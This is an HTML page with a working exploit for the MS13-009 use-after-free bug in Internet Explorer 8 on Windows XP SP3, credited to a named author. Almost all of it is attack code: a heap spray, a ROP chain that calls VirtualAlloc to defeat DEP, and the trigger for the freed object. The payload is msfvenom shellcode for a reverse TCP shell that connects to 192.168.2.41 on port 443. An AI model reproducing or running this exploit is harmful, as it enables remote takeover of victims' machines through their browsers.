<!doctype html>
<html>
<script>
//Exploit: MS13-009 Use-After-Free IE8 (DEP)                              
//Author: Eric Van Zutphen - www.shellcoderz.com
//OS: Tested on XP PRO SP3                                              
//Browser: Internet Explorer 8.00.6001.18702

    //Fix BSTR spec
	function alloc(bytes, mystr) {
		while (mystr.length<bytes) mystr += mystr;
		return mystr.substr(0, (bytes-6)/2);
	}
	
	block_size = 0x1000; //4096 bytes
	padding_size = 0x5F4; //Offset for 0c0c0c0c - Need to make sure to subtract blocks of 0x1000 until you find the offset to 0c0c0c0c
	Padding = '';
	NopSlide = '';

	var Shellcode = unescape(
	//ROP Chain  VirtualAlloc()
    "%u2b28%u77c2" + // 0x77c22b28 : ,# POP EBP # RETN [msvcrt.dll] 
    "%u2b28%u77c2" + // 0x77c22b28 : ,# skip 4 bytes [msvcrt.dll]
    "%u6ea3%u77c4" + // 0x77c46ea3 : ,# POP EBX # RETN [msvcrt.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%ucd18%u77c4" + // 0x77c4cd18 : ,# POP EDX # RETN [msvcrt.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%u1ea7%u77c4" + // 0x77c41ea7 : ,# POP ECX # RETN [msvcrt.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%u7cd8%u77c4" + // 0x77c47cd8 : ,# POP EDI # RETN [msvcrt.dll] 
    "%u6101%u77c4" + // 0x77c46101 : ,# RETN (ROP NOP) [msvcrt.dll]
    "%ueabd%u77c2" + // 0x77c2eabd : ,# POP ESI # RETN [msvcrt.dll] 
    "%uaacc%u77c2" + // 0x77c2aacc : ,# JMP [EAX] [msvcrt.dll]
    "%uded4%u77c4" + // 0x77c4ded4 : ,# POP EAX # RETN [msvcrt.dll] 
    "%u110c%u77c1" + // 0x77c1110c : ,# ptr to &VirtualAlloc() [IAT msvcrt.dll]
    "%u2df9%u77c1" + // 0x77c12df9 : ,# PUSHAD # RETN [msvcrt.dll] 
    "%u5524%u77c3" + // 0x77c35524 : ,# ptr to 'push esp # ret ' [msvcrt.dll]

    '%u4141%ueb37'+ // Jmp Forward Over EIP
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
	'%u4141%u4141'+
	'%ua59d%u7ca8'+ // EIP: 7CA8A59D XCHG EAX,ESP#RETN
	'%u9090%u9090'+ // Nop Slide	
	'%u9090%u9090'+ // Nop Slide
	'%u9090%u9090'+ // Nop Slide
	'%u9090%u9090'+ // Nop Slide
	'%u9090%u9090'+ // Nop Slide
	'%u9090%u9090'+ // Nop Slide
	'%u9090%u9090'+ // Nop Slide	
//msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp EXITFUN=seh -b '\x00' -f js_le LHOST=192.168.2.41 LPORT=443
//Payload Size: 351 Bytes
	'%u26b8%u1284%udb4f%ud9cc%u2474%u5ff4%uc933%u52b1%uef83%u31fc%u0e47%u6103%uf08a%u91ba%u767a%u6944%u177b%u8ccc%u174a%uc5aa%ua7fd%u8bb8%u4cf1%u3fec%u2181%u3039%u8f22%u7f1f%ubcb3%u1e5c%ubf37%uc0b0%u7006%u01c5%u6d4e%u5324%uf907%u439b%ub72c%ue827%u597e%u0d20%u5836%u8001%u034c%u2381%u3f80%u3b88%u7ac5%ub042%uf03d%u1055%uf90c%u5dfa%u08a0%u9a02%uf307%ud271%u8e7b%u2181%u5401%ub107%u1fa1%u1dbf%uf353%ud626%ub85f%ub02d%u3f43%ucbe1%ub478%u1b04%u8e09%ubf22%u5451%ue64a%u3b3f%uf873%ue49f%u73d1%uf00d%ude6b%u355a%ue046%u519a%u93d1%ufea8%u3b49%u7781%ubc54%uade6%u5220%u4e19%u7b51%u1ade%u1301%u22f7%ue3ca%uf6f8%ub35d%ua956%u631d%u1917%u69f6%u4698%u92e6%uef72%u698d%ud015%u73fa%ub8cc%u73f8%u820f%u9574%ue465%u0ed0%u9d12%uc478%u6283%ua157%ue984%u5654%u1a4a%u4410%uea3b%u366f%uf5ea%u5e45%u6770%u9e02%u94ff%uc99d%u6ba8%u9fd4%ud544%ubd4e%u8394%u05a9%u7043%u8437%ucc06%u9613%ucdde%uc21f%u9b8e%ubcc9%u7268%u16b8%u2923%ufe12%u01b2%u78a5%u4fbb%u6453%u260a%u9b22%uaea3%ue4a2%u4ed9%u3f4c%u7e5a%u1d07%u17cb%uf4ce%u7a49%u23f1%u838d%uc172%u706e%ua06a%u3c6b%u592c%u2d06%u5dd9%u4eb5%u41c8'
	); 
	
	
	for (p = 0; p < padding_size; p++) {
	Padding += unescape('%u3737');}

	for (c = 0; c < block_size; c++) {
	NopSlide += unescape('%u9090');}
	NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
	
	var OBJECT = Padding + Shellcode + NopSlide;
	OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
	
	var evil = new Array();
	for (var k = 0; k < 150; k++) {
		evil[k] = OBJECT.substr(0, OBJECT.length);
	}
	alert('[*] Heap Spray Complete![*]')
 
    var data;
    var objArray = new Array(1150);
  
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
  
    CollectGarbage();
  
        for (var i=0;i<2550;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c"); 
        }
  
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
  
</script>
</head>
<body>
<p> </p>
</body>
</html>
